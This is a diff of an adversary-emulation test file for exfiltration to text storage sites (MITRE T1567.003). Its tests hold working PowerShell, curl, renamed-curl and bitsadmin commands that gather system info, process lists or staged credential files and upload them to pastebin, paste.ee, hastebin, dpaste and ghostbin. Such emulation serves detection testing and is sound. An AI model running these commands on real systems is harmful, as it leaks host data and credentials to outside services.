@@ -1,59 +1,109 @@
 attack_technique: T1567.003
-display_name: 'Exfiltration Over Web Service: Exfiltration to Text Storage Sites - Custom'
+display_name: "Exfiltration Over Web Service: Exfiltration to Text Storage Sites"
+
 atomic_tests:
-  - name: PowerShell Invoke-RestMethod exfil to pastebin (custom)
-    auto_generated_guid: a1b2c3d4-e5f6-7890-abcd-ef1234567890
-    description: |
-      Simulates credential exfiltration to pastebin.com via PowerShell
-      Invoke-RestMethod POST. Produces EID 1 with powershell.exe Image
-      and pastebin.com in CommandLine. API key is redacted — not executed.
-    supported_platforms:
-      - windows
-    executor:
-      name: powershell
-      elevation_required: false
-      command: |
-        Invoke-RestMethod -Uri https://pastebin.com/api/api_post.php `
-          -Method Post `
-          -Body @{
-            api_dev_key  = "REDACTED"
-            api_option   = "paste"
-            api_paste_code = "exfil_placeholder_data"
-          }
-  - name: PowerShell WebClient Exfil to Pastebin via EID3 (custom)
-    auto_generated_guid: a3f2c891-7d4e-4b8a-9c1f-2e5d6a7b8c9d
-    description: |
-      Exfiltrates data to pastebin.com using System.Net.WebClient POST request.
-      Generates EID 3 (network connection) to pastebin.com on port 443.
-      Uses WebClient directly to produce a clean network connection event.
-    supported_platforms:
-      - windows
-    executor:
-      name: powershell
-      elevation_required: false
-      command: |
-        $data = "exfil_test_data_secrets_api_keys"
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-        $body = "api_dev_key=test_key&api_option=paste&api_paste_code=" + $data
-        try {
-          $result = $wc.UploadString("https://pastebin.com/api/api_post.php", $body)
-        } catch {}
- 
-  - name: PowerShell Invoke-WebRequest Exfil to textbin.net via EID3 (custom)
-    auto_generated_guid: b4e3d902-8e5f-5c9b-0d2g-3f6e7b8c9d0e
-    description: |
-      Exfiltrates data to textbin.net using Invoke-WebRequest POST.
-      Generates EID 3 (network connection) to textbin.net on port 443.
-      Uses a different text storage site to vary the network destination.
-    supported_platforms:
-      - windows
-    executor:
-      name: powershell
-      elevation_required: false
-      command: |
-        $data = "exfil_test_payload_passwords_tokens"
-        $uri = "https://textbin.net/post"
-        try {
-          Invoke-WebRequest -Uri $uri -Method POST -Body @{content=$data} -UseBasicParsing
-        } catch {}
+- name: PowerShell Upload Recon Output to Pastebin API
+  auto_generated_guid: 1d8f7f11-1111-4b61-9001-a11111111111
+  description: |
+    Collect local recon data and upload to Pastebin API using PowerShell.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Temp recon file
+      type: path
+      default: C:\Users\Public\sysinfo.txt
+  executor:
+    name: powershell
+    command: |
+      systeminfo > "#{output_file}";
+      Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{api_dev_key="test";api_option="paste";api_paste_code=(Get-Content "#{output_file}" -Raw)}
+    cleanup_command: |
+      Remove-Item "#{output_file}" -ErrorAction Ignore
+
+- name: Curl Upload Credentials File to Paste.ee
+  auto_generated_guid: 1d8f7f11-2222-4b61-9001-a22222222222
+  description: |
+    Stage file and upload using native curl.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    loot_file:
+      type: path
+      default: C:\Users\Public\creds.txt
+  executor:
+    name: command_prompt
+    command: |
+      echo admin:Winter2024!> "#{loot_file}" && curl.exe -X POST -F "file=@#{loot_file}" https://paste.ee/api
+    cleanup_command: |
+      del "#{loot_file}" >nul 2>nul
+
+- name: Encoded PowerShell POST to Hastebin
+  auto_generated_guid: 1d8f7f11-3333-4b61-9001-a33333333333
+  description: |
+    Use encoded PowerShell command to POST text to hastebin-like endpoint.
+  supported_platforms:
+  - windows
+  executor:
+    name: command_prompt
+    command: |
+      powershell.exe -WindowStyle Hidden -Command "$d='hostname='+$env:COMPUTERNAME;Invoke-RestMethod -Uri https://hastebin.com/documents -Method Post -Body $d"
+
+- name: Archive Then Upload to dpaste
+  auto_generated_guid: 1d8f7f11-4444-4b61-9001-a44444444444
+  description: |
+    Compress staged data then upload through PowerShell web request.
+  supported_platforms:
+  - windows
+  input_arguments:
+    src_file:
+      type: path
+      default: C:\Users\Public\notes.txt
+    zip_file:
+      type: path
+      default: C:\Users\Public\data.zip
+  executor:
+    name: powershell
+    command: |
+      Get-Process | Out-File "#{src_file}";
+      Compress-Archive "#{src_file}" "#{zip_file}" -Force;
+      Invoke-WebRequest -Uri "https://dpaste.com/api/v2/" -Method POST -InFile "#{zip_file}"
+    cleanup_command: |
+      Remove-Item "#{src_file}","#{zip_file}" -ErrorAction Ignore
+
+- name: Renamed Curl Upload Browser History
+  auto_generated_guid: 1d8f7f11-5555-4b61-9001-a55555555555
+  description: |
+    Copy curl.exe to alternate name and upload staged file.
+  supported_platforms:
+  - windows
+  input_arguments:
+    fake_curl:
+      type: path
+      default: C:\Users\Public\AdobeSync.exe
+    hist_file:
+      type: path
+      default: C:\Users\Public\history.txt
+  executor:
+    name: command_prompt
+    command: |
+      copy C:\Windows\System32\curl.exe "#{fake_curl}" && echo urls> "#{hist_file}" && "#{fake_curl}" -X POST -F "c=@#{hist_file}" https://paste.ee/api
+    cleanup_command: |
+      del "#{fake_curl}" >nul 2>nul & del "#{hist_file}" >nul 2>nul
+
+- name: Bitsadmin Upload Inventory File to Ghostbin
+  auto_generated_guid: 1d8f7f11-6666-4b61-9001-a66666666666
+  description: |
+    Stage host inventory data and invoke BITSAdmin with a Ghostbin destination URL to emulate exfiltration over a text storage service.
+  supported_platforms:
+  - windows
+  input_arguments:
+    loot_file:
+      type: path
+      default: C:\Users\Public\inventory.txt
+  executor:
+    name: command_prompt
+    command: |
+      systeminfo > "#{loot_file}" && bitsadmin /transfer cachejob /upload /priority foreground "#{loot_file}" https://ghostbin.com/paste
+    cleanup_command: |
+      del "#{loot_file}" >nul 2>nul
